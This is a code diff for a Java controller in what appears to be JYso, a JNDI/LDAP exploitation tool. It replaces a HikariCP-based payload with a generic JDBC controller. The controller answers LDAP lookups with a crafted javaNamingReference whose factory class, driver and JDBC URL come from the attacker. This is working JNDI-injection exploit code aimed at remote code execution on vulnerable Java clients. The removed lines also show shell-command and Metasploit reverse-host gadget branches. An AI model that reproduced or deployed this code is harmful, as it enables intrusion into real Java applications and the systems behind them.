@@ -3,23 +3,18 @@ package com.qi4l.JYso.controllers;
 import com.qi4l.JYso.enumtypes.GadgetType;
 import com.qi4l.JYso.exceptions.IncorrectParamsException;
 import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
-import com.qi4l.JYso.gadgets.Config.Config;
-import com.qi4l.JYso.gadgets.utils.Gadgets;
-import com.qi4l.JYso.gadgets.utils.InjShell;
 import com.qi4l.JYso.gadgets.utils.Util;
-import com.qi4l.JYso.gadgets.utils.handle.ClassNameHandler;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
 import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
-
-import javax.naming.Reference;
-import javax.naming.StringRefAddr;
+import org.fusesource.jansi.Ansi;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
-@LdapMapping(uri = {"/hikaricp"})
-public class HikariCPController implements LdapController{
+@LdapMapping(uri = {"/jdbc1"})
+public class jdbcController1 implements LdapController {
+
     private String payloadType;
 
     private String     factoryType;
@@ -29,19 +24,16 @@ public class HikariCPController implements LdapController{
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
-            System.out.println(ansi().render("@|green [+] Sending LDAP ResourceRef result for|@" + base + "  @|green with javax.el.ELProcessor payload|@"));
-            System.out.println("-------------------------------------- JNDI Local  Refenrence Links --------------------------------------");
+            Entry  e    = new Entry(base);
+            String driver = payloadType;
+            String JDBC_URL1 = params[0];
+            System.out.println("JDBC_URL1: " + JDBC_URL1);
 
-            Entry                                   e      = new Entry(base);
-            Reference                               ref    = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
-            String                                  code   = null;
+            e.addAttribute("objectClass","javaNamingReference");
+            e.addAttribute("javaClassName", "javax.sql.DataSource");
+            e.addAttribute("javaFactory",factoryType);
+            e.addAttribute("javaReferenceAddress", "/0/url/"+JDBC_URL1,"/1/driverClassName/" + driver,"/2/username/Squirt1e","/3/password/Squirt1e","/4/initialSize/1");
 
-            String JDBC_URL = "";
-            String JDBC_URL1 = JDBC_URL.replace("{replacement}", code);
-            ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
-            ref.add(new StringRefAddr("jdbcUrl", JDBC_URL1));
-            e.addAttribute("javaClassName", "java.lang.String");
-            e.addAttribute("javaSerializedData", Util.serialize(ref));
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         } catch (Throwable er) {
@@ -52,6 +44,7 @@ public class HikariCPController implements LdapController{
 
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
+        System.out.println("- JNDI JDBC Refenrence Links ");
         try {
             base = base.replace('\\', '/');
             int fistIndex   = base.indexOf("/");
@@ -60,7 +53,7 @@ public class HikariCPController implements LdapController{
 
             try {
                 payloadType = base.substring(fistIndex + 1, secondIndex);
-                System.out.println(ansi().render("@|green [+] PaylaodType : |@" + payloadType));
+                System.out.println(Ansi.ansi().fgBrightMagenta().a("  driver: " + payloadType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -70,7 +63,7 @@ public class HikariCPController implements LdapController{
 
             try {
                 factoryType = base.substring(secondIndex + 1, thirdIndex);
-                System.out.println(ansi().render("@|green [+] FactoryType : |@" + factoryType));
+                System.out.println(Ansi.ansi().fgBrightBlue().a("  Factory: " + factoryType).reset());
             } catch (IllegalArgumentException e) {
                 throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + base.substring(fistIndex + 1, secondIndex));
             }
@@ -88,27 +81,10 @@ public class HikariCPController implements LdapController{
 
             if (gadgetType == GadgetType.base64) {
                 String cmd = Util.getCmdFromBase(base);
-                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
+                System.out.println(Ansi.ansi().fgBrightRed().a("  JDBC_URL: " + cmd).reset());
                 params = new String[]{cmd};
             }
 
-            if (gadgetType == GadgetType.shell) {
-                String   cmd1         = Util.getCmdFromBase(base);
-                byte[]   decodedBytes = Util.base64Decode(cmd1);
-                String   cmd          = new String(decodedBytes);
-                String[] cmdArray     = cmd.split(" ");
-                System.out.println(ansi().render("@|green [+] Command : |@" + cmd));
-                params = cmdArray;
-            }
-
-            if (gadgetType == GadgetType.msf) {
-                String[] results1 = Util.getIPAndPortFromBase(base);
-                Config.rhost = results1[0];
-                Config.rport = results1[1];
-                System.out.println("[+] RemotHost: " + results1[0]);
-                System.out.println("[+] RemotPort: " + results1[1]);
-                params = results1;
-            }
         } catch (Exception e) {
             if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
 
